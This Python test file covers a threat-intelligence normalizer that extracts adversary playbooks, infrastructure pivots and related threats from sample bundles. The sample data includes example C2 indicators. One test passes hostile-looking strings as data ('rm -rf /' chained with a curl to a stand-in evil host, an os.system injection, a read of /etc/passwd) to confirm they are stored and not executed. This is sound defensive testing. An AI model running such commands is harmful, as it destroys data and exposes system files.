"""Ticket 07 — Normalizer extraction blocks (adversary_playbooks, pivots, related threats).

Three pure additive extraction blocks on the Threadlinqs normalizer so raw
bundle responses become the enrichment fields the pipeline consumes:

- ``simulations``         → ``adversary_playbooks: list[str]``
- ``infrastructure_pivots`` → ``infrastructure_pivots: list[dict]``
- ``similar_threats``     → ``related_threats: list[str]``

The existing indicator / technique extraction paths are untouched
(ADDITIVE-ONLY). All three blocks degrade to empty lists on missing, ``None``,
wrong-type, or empty input — never an exception.

The representative bundle fixture mirrors the verified v7.1.0
``get_threat_hunting_bundle`` envelope shape (see
``test_threadlinqs_client.THREAT_HUNTING_ENVELOPE``): top-level ``iocs``,
``similar_threats``, ``simulations``, ``infrastructure_pivots``,
``techniques`` keys. The unknown item shapes are exercised defensively
(string items, dict items, mixed, malformed) because the server schema for
these three blocks is not fully pinned by the registry.
"""

from __future__ import annotations

import json


# ---------------------------------------------------------------------------
# Representative bundle — real envelope shape (v7.1.0 get_threat_hunting_bundle)
# ---------------------------------------------------------------------------

SAMPLE_BUNDLE = {
    "id": "TL-2026-1693",
    "title": "Enrichment Campaign",
    "iocs": {
        "network": [
            {"type": "ip", "value": "45.93.20.28", "context": "C2 server"},
            {"type": "domain", "value": "evil-c2.example.net", "context": "Pivot C2"},
        ],
        "file": [
            {"type": "sha256", "value": "c" * 64, "context": "Sample"},
        ],
        "behavioral": [
            {"type": "technique", "value": "T1059.001 - PowerShell", "context": "Execution"},
        ],
    },
    "similar_threats": [
        {"name": "APT-29", "id": "G0016"},
        "Turla",
        {"title": "APT-29"},  # duplicate of the dict above via a different key
    ],
    "simulations": [
        "RDP Lateral Movement",
        {"playbook": "LSASS Credential Dumping", "id": "SIM-1"},
        {"name": "RDP Lateral Movement"},  # duplicate of the string above
    ],
    "infrastructure_pivots": [
        {"type": "ipv4", "value": "203.0.113.7", "context": "pivot C2"},
        {"type": "domain", "value": "evil-c2.example.net"},
        {"type": "ipv4", "value": "203.0.113.7", "context": "pivot C2"},  # exact duplicate dict
    ],
    "techniques": [{"id": "T1059.001", "name": "PowerShell"}],
}


# ===========================================================================
# 1-3. Direct block extraction — valid input
# ===========================================================================


class TestExtractSimulations:
    def test_string_items_extracted(self):
        from app.services.threadlinqs_normalizer import _extract_simulations

        result = _extract_simulations(["RDP Lateral Movement", "LSASS Credential Dumping"])
        assert result == ["RDP Lateral Movement", "LSASS Credential Dumping"]

    def test_dict_items_extracted_from_playbook_name(self):
        from app.services.threadlinqs_normalizer import _extract_simulations

        result = _extract_simulations(
            [
                {"playbook": "LSASS Credential Dumping", "id": "SIM-1"},
                {"name": "RDP Lateral Movement"},
            ]
        )
        assert result == ["LSASS Credential Dumping", "RDP Lateral Movement"]

    def test_mixed_items_and_stripping(self):
        from app.services.threadlinqs_normalizer import _extract_simulations

        result = _extract_simulations(
            ["  RDP Lateral Movement  ", {"playbook": "  LSASS  "}, "RDP Lateral Movement"]
        )
        assert result == ["RDP Lateral Movement", "LSASS"]


class TestExtractPivots:
    def test_dict_items_extracted(self):
        from app.services.threadlinqs_normalizer import _extract_pivots

        result = _extract_pivots(
            [
                {"type": "ipv4", "value": "203.0.113.7", "context": "pivot C2"},
                {"type": "domain", "value": "evil-c2.example.net"},
            ]
        )
        assert result == [
            {"type": "ipv4", "value": "203.0.113.7", "context": "pivot C2"},
            {"type": "domain", "value": "evil-c2.example.net"},
        ]

    def test_non_dict_items_filtered(self):
        from app.services.threadlinqs_normalizer import _extract_pivots

        result = _extract_pivots(
            [
                {"type": "ipv4", "value": "203.0.113.7"},
                "just-a-string",
                42,
                None,
                ["nested"],
            ]
        )
        assert result == [{"type": "ipv4", "value": "203.0.113.7"}]

    def test_unsafe_nested_values_filtered_to_scalars(self):
        """Nested dict/list/None values are dropped — safe typed shape only."""
        from app.services.threadlinqs_normalizer import _extract_pivots

        result = _extract_pivots(
            [
                {
                    "type": "ipv4",
                    "value": "203.0.113.7",
                    "nested": {"skip": "me"},
                    "items": [1, 2],
                    "nothing": None,
                }
            ]
        )
        assert result == [{"type": "ipv4", "value": "203.0.113.7"}]

    def test_empty_dict_after_filter_dropped(self):
        from app.services.threadlinqs_normalizer import _extract_pivots

        result = _extract_pivots([{"only_nested": {"a": 1}}, {"type": "domain", "value": "x.example"}])
        assert result == [{"type": "domain", "value": "x.example"}]


class TestExtractSimilarThreats:
    def test_string_items_extracted(self):
        from app.services.threadlinqs_normalizer import _extract_similar_threats

        result = _extract_similar_threats(["APT-29", "Turla"])
        assert result == ["APT-29", "Turla"]

    def test_dict_items_extracted_by_name_title(self):
        from app.services.threadlinqs_normalizer import _extract_similar_threats

        result = _extract_similar_threats(
            [
                {"name": "APT-29", "id": "G0016"},
                {"title": "Turla Group"},
            ]
        )
        assert result == ["APT-29", "Turla Group"]

    def test_mixed_items_and_stripping(self):
        from app.services.threadlinqs_normalizer import _extract_similar_threats

        result = _extract_similar_threats(["  APT-29  ", {"name": "Turla", "id": "G0010"}, "APT-29"])
        assert result == ["APT-29", "Turla"]


# ===========================================================================
# 5-7. Empty / malformed / wrong-type input → empty lists
# ===========================================================================


class TestEmptyAndMalformedInput:
    def test_missing_keys_yield_empty_lists(self):
        from app.services.threadlinqs_normalizer import normalize_bundle

        threat = normalize_bundle({"id": "TL-X", "iocs": {"network": []}})
        assert threat.adversary_playbooks == []
        assert threat.infrastructure_pivots == []
        assert threat.related_threats == []

    def test_none_payload_yields_empty_lists(self):
        from app.services.threadlinqs_normalizer import (
            _extract_pivots,
            _extract_similar_threats,
            _extract_simulations,
        )

        assert _extract_simulations(None) == []
        assert _extract_pivots(None) == []
        assert _extract_similar_threats(None) == []

    def test_wrong_type_payload_yields_empty_lists(self):
        from app.services.threadlinqs_normalizer import (
            _extract_pivots,
            _extract_similar_threats,
            _extract_simulations,
        )

        for payload in ("a string", 42, {"dict": 1}, 3.14):
            assert _extract_simulations(payload) == []
            assert _extract_pivots(payload) == []
            assert _extract_similar_threats(payload) == []

    def test_empty_list_and_empty_strings_yield_empty_lists(self):
        from app.services.threadlinqs_normalizer import (
            _extract_pivots,
            _extract_similar_threats,
            _extract_simulations,
        )

        assert _extract_simulations([]) == []
        assert _extract_simulations(["   ", ""]) == []
        assert _extract_pivots([]) == []
        assert _extract_similar_threats([]) == []
        assert _extract_similar_threats([{"other": "key"}, ""]) == []

    def test_dict_without_known_text_key_skipped(self):
        from app.services.threadlinqs_normalizer import _extract_simulations

        assert _extract_simulations([{"id": "SIM-1", "ignored": "field"}]) == []


# ===========================================================================
# 4. Complete bundle → all three fields populated via normalize_bundle
# ===========================================================================


class TestNormalizeBundleEnrichment:
    def test_complete_bundle_populates_all_three_fields(self):
        from app.services.threadlinqs_normalizer import normalize_bundle

        threat = normalize_bundle(SAMPLE_BUNDLE)
        assert threat.adversary_playbooks == [
            "RDP Lateral Movement",
            "LSASS Credential Dumping",
        ]
        assert threat.infrastructure_pivots == [
            {"type": "ipv4", "value": "203.0.113.7", "context": "pivot C2"},
            {"type": "domain", "value": "evil-c2.example.net"},
        ]
        assert threat.related_threats == ["APT-29", "Turla"]

    def test_russian_text_is_data_not_instruction(self):
        """Arbitrary CTI text lands inside fields — never executed or interpreted."""
        from app.services.threadlinqs_normalizer import normalize_bundle

        bundle = {
            **SAMPLE_BUNDLE,
            "simulations": [
                "sudo rm -rf / ; curl http://evil.example/run?id={{cmd}}",
                {"playbook": "__import__('os').system('echo pwned')"},
            ],
            "similar_threats": ["x=$(cat /etc/passwd)"],
        }
        threat = normalize_bundle(bundle)
        # The dangerous-looking strings are data: present verbatim in the fields.
        assert "sudo rm -rf / ; curl http://evil.example/run?id={{cmd}}" in threat.adversary_playbooks
        assert "__import__('os').system('echo pwned')" in threat.adversary_playbooks
        assert threat.related_threats == ["x=$(cat /etc/passwd)"]


# ===========================================================================
# 8-9. Existing indicator / technique extraction untouched (byte-compatible)
# ===========================================================================


class TestExistingExtractionUntouched:
    def _expected_baseline(self):
        """Indicators + techniques from the same fixture, computed by live code."""
        from app.services.threadlinqs_normalizer import normalize_bundle

        # Baseline bundle has the same iocs/techniques but no enrichment keys.
        baseline = {k: v for k, v in SAMPLE_BUNDLE.items() if k not in ("similar_threats", "simulations", "infrastructure_pivots")}
        return normalize_bundle(baseline)

    def test_indicators_unchanged(self):
        from app.services.threadlinqs_normalizer import normalize_bundle

        baseline = self._expected_baseline()
        threat = normalize_bundle(SAMPLE_BUNDLE)

        assert len(threat.iocs) == len(baseline.iocs) == 3
        assert [i.value for i in threat.iocs] == [i.value for i in baseline.iocs]
        assert [(i.value, i.ioc_type, i.source) for i in threat.iocs] == [
            (i.value, i.ioc_type, i.source) for i in baseline.iocs
        ]
        # Pivots did not replace, delete, or merge into IOCs.
        assert {"45.93.20.28", "evil-c2.example.net", "c" * 64} == {i.value for i in threat.iocs}

    def test_techniques_unchanged(self):
        from app.services.threadlinqs_normalizer import normalize_bundle

        baseline = self._expected_baseline()
        threat = normalize_bundle(SAMPLE_BUNDLE)

        assert [(b.technique_id, b.technique_name) for b in threat.behavioral] == [
            (b.technique_id, b.technique_name) for b in baseline.behavioral
        ]
        assert threat.ttps == baseline.ttps == ["T1059.001"]

    def test_no_ioc_replacement_by_pivots(self):
        from app.services.threadlinqs_normalizer import normalize_bundle

        threat = normalize_bundle(SAMPLE_BUNDLE)
        # Every pivot value is separate from the IOC set — the IOC whose value
        # also appears as a pivot (evil-c2.example.net) is still an IOC.
        ioc_values = {i.value for i in threat.iocs}
        pivot_values = {p.get("value") for p in threat.infrastructure_pivots if isinstance(p.get("value"), str)}
        assert "evil-c2.example.net" in ioc_values
        assert "evil-c2.example.net" in pivot_values
        assert len(threat.iocs) == 3  # nothing was removed or duplicated
        assert len([i for i in threat.iocs if i.value == "evil-c2.example.net"]) == 1


# ===========================================================================
# 10-11. Determinism + duplicate handling
# ===========================================================================


class TestDeterminism:
    def test_repeated_normalization_is_deterministic(self):
        from app.services.threadlinqs_normalizer import normalize_bundle

        first = normalize_bundle(SAMPLE_BUNDLE)
        second = normalize_bundle(SAMPLE_BUNDLE)

        assert first.adversary_playbooks == second.adversary_playbooks
        assert first.infrastructure_pivots == second.infrastructure_pivots
        assert first.related_threats == second.related_threats
        assert json.dumps(first.infrastructure_pivots, sort_keys=True) == json.dumps(
            second.infrastructure_pivots, sort_keys=True
        )

    def test_duplicate_strings_deduped_by_first_occurrence(self):
        from app.services.threadlinqs_normalizer import _extract_similar_threats, _extract_simulations

        assert _extract_simulations(["A", "B", "A", "a", "A "]) == ["A", "B", "a"]
        assert _extract_similar_threats(["X", "Y", "X"]) == ["X", "Y"]

    def test_duplicate_dicts_deduped_deterministically(self):
        from app.services.threadlinqs_normalizer import _extract_pivots

        result = _extract_pivots(
            [
                {"type": "ipv4", "value": "203.0.113.7", "context": "pivot C2"},
                {"type": "ipv4", "value": "203.0.113.7", "context": "pivot C2"},
                {"value": "203.0.113.7", "type": "ipv4", "context": "pivot C2"},  # key-order variant
            ]
        )
        # Canonical first-occurrence dedupe: identical content collapses once,
        # preserving the first dict exactly.
        assert result == [{"type": "ipv4", "value": "203.0.113.7", "context": "pivot C2"}]